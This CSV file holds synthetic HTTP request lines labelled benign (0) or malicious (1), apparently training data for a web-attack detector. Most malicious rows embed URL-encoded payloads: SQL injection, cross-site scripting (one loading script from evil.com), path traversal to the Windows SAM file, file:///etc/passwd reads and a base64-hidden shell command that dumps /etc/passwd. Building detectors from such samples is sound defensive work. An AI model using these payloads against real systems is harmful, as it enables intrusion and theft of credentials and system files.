text,label
HEAD /register?rating=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&phone=449&tags=system+log+entry&email=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /register title=282 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/products?region=405&date=hello+world&age=%27%20AND%20%27x%27%3D%27x&tags=hello+world&rating=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /docs/api search=828&category=best%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /register color=123%20%3Csvg/onload%3Dalert%281%29%3E%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /dashboard?quantity=please%20%27%20OR%20%271%27%3D%271%27--%20comment&search_term=system+log+entry&comment=603 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /api/users email=%3Cbody%20onload%3Dalert%28document.domain%29%3E&q=test+user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /products/123?view=please+find+attached&author=file%3A///etc/passwd&tag=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /users/456 page=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&token=16&filter=669 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /api/users limit=173 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /dashboard limit=thank%20admin%27--%20you&view=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /api/search?color=system+log+entry&columns=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&last_name=984&old_password=127 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/search order=I%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
